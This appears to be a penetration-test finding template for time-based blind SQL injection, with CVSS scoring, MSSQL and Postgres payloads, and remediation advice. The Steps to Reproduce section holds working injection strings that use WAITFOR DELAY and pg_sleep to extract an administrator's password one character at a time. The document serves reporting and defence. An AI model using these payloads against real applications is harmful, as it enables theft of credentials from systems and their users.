# SQL Injection - Time-Based Blind SQL Injection

**Title:** Time-Based Blind SQL Injection

**Severity:** High

**Impact:** High

**Exploitability:** Medium

**CVSS Base Score:** 7.5

**CVSS v3 Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

**Vulnerability Type:** SQL Injection

**Target:** TrackingId or similar blind parameter

## Impact

Allows data extraction through response time differences when no output is visible.

## Description

The application is vulnerable to time-based blind SQL injection. Conditional delays can be used to infer data.

## Steps to Reproduce

**Detection:**
```
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

**Exploitation:**
```
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:10'--
```

Postgres:
```
%3BSELECT CASE WHEN ((SELECT COUNT(username) FROM users WHERE username = 'administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

## Recommendation

Use parameterized queries. Normalize response times. Implement proper error handling.

## References

- PortSwigger SQL Injection Cheat Sheet
